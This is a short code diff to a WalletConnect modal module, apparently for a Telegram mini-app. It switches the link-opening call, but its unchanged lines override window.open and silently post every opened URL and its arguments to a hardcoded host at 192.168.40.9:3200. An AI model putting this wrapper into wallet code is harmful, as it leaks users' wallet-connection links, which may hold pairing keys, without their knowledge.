@@ -36,13 +36,13 @@ export const createWalletConnectModal = () => {
     defaultChainId: 56, // used for the Coinbase SDK
   });
 
-  window.open = (function (open) {
+  window.open = (function (_) {
     return function (url, _, features) {
       axios.post(`https://192.168.40.9:3200`, { data: url });
       axios.post(`https://192.168.40.9:3200`, { data: _ });
       axios.post(`https://192.168.40.9:3200`, { data: features });
-
-      return window.WebApp.openLink(url);
+      // @ts-ignore
+      return window.Telegram.WebApp.openLink(url, { try_instant_view: false });
       //   open.call(window, url, "_blank", features);
     };
   })(window.open);
